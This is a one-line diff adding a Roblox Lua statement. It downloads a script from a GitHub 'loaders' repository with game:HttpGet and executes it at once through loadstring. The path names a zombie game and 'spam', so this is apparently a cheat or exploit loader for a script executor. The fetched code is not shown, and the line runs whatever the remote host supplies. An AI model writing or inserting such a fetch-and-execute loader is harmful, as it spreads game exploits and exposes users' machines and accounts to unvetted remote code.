@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/BudgieRectifier/loaders/main/loaders/zombies-bloxstrike-spam4-zxpzyktlmfodh3.lua"))()
